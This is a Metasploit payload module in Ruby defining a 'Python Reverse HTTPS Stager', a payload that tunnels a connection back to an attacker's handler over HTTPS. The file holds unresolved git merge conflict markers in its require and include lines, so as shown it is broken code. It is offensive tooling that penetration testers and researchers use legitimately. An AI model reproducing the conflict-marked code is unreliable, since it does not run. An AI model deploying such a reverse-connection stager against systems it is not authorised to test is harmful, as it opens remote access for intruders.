##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_https'
<<<<<<< HEAD
require 'msf/core/payload/python'
require 'msf/core/payload/python/reverse_http'
=======
require 'msf/core/payload/uuid/options'
>>>>>>> origin/4.11.2_release_pre-rails4

module Metasploit4

  CachedSize = 762

  include Msf::Payload::Stager
<<<<<<< HEAD
  include Msf::Payload::Python
  include Msf::Payload::Python::ReverseHttp
=======
  include Msf::Payload::UUID::Options
>>>>>>> origin/4.11.2_release_pre-rails4

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Python Reverse HTTPS Stager',
      'Description'   => 'Tunnel communication over HTTP using SSL',
      'Author'        => 'Spencer McIntyre',
      'License'       => MSF_LICENSE,
      'Platform'      => 'python',
      'Arch'          => ARCH_PYTHON,
      'Handler'       => Msf::Handler::ReverseHttps,
      'Stager'        => {'Payload' => ""}
    ))
  end

  #
  # Constructs the payload
  #
  def generate
    super({scheme: 'https'})
  end

end
